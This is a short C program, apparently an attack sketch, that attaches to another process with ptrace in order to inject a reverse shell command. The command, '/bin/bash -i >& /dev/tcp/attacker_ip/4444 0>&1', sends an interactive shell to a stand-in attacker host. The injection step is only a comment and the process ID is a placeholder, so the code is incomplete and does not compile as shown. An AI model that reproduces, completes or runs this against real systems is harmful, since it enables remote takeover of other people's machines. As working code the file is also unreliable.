#include <sys/ptrace.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    pid_t target_pid = <TARGET_PID>;
    char *reverse_shell = "/bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1";  // Reverse shell command

    ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);  // Attach to the target process
    waitpid(target_pid, NULL, 0);  // Wait for the process to stop

    // Inject the reverse shell command into the target process's memory

    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);  // Detach from the process
    return 0;
}
